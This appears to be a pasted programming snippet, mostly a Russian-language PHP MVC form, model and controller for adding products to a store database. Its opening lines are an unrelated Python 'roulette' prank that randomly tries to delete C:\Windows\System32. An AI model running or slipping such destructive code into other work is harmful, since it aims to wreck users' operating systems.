import random
import os
if random.randint(0, 6) == 1:
    os.remove('C:\Windows\System32')



<form action="/Store" method="post" class="form_flex">
  <h3>Создать банан</h3>
  <div class="form_input-box">
    <input type="text" name="name" placeholder="Введите название"/>
    <span style="color: red"><?=!empty($errors) && isset($errors['name']) ? $errors['name'] : '' ?></span>
  </div>
  <div class="form_input-box">
    <input type="text" name="price"  placeholder="Введите цену"/>
    <span style="color: red"><?=!empty($errors) && isset($errors['price']) ? $errors['price'] : '' ?></span>
  </div>
  <div class="form_input-box">
    <input type="text" name="preview"  placeholder="Введите ссылку на картинку"/>
    <span style="color: red"><?=!empty($errors) && isset($errors['preview']) ? $errors['preview'] : '' ?></span>
  </div>
  <button class="form_button" id="closeFormButton" type="submit">Отправить</button>
</form>


Это ModelStore

<?php
class ModelStore extends Model
{
    private $message = [
        'name' => 'Введите имя',
        'price' => 'Введите цену',
        'preview' => 'Введите ссылку на картинку',
    ];

    public function save($data)
    {
        $stmt = $this->connect->prepare("INSERT INTO products (id, name, price, preview) VALUES (NULL, ?, ?, ?)");
        $stmt->bind_param("sss", $data['name'], $data['price'], $data['preview']);
        $stmt->execute();
    }

    public function validateData($data)
    {
        if (!empty($data['name'])) {
            $feedback['data']['name'] = $data['name'];
        } else {
            $feedback['errors']['name'] = $this->message['name'];
        }
        if (!empty($data['price'])) {
            $feedback['data']['price'] = $data['price'];
        } else {
            $feedback['errors']['price'] = $this->message['price'];
        }
        if (!empty($data['preview'])) {
            $feedback['data']['preview'] = $data['preview'];
        } else {
            $feedback['errors']['preview'] = $this->message['preview'];
        }

        return $feedback;
    }
}
?>



Это контроллер

<?php

include 'application/models/ModelMain.php';

class ControllerStore extends Controller
{
    function __construct()
    {
        $this->model = new ModelStore();
        $this->view = new View();
    }
  function index()
  {
        $mainModel = new ModelMain();
        $data = $mainModel->getData();
        if (!empty($_POST) and $_SERVER["REQUEST_METHOD"] == "POST") {
            $storeData = $this->model->validateData($_POST);
            $data['errors'] = isset($storeData['errors'])
                ? $storeData['errors']
                : '';
            if (empty($data['errors'])) {
                $this->model->save($storeData['data']);
                header('Location: /');
            }
        }

        $this->view->generate(
            'main_view.php',
            'template_view.php',
            $data);
  }
}
?>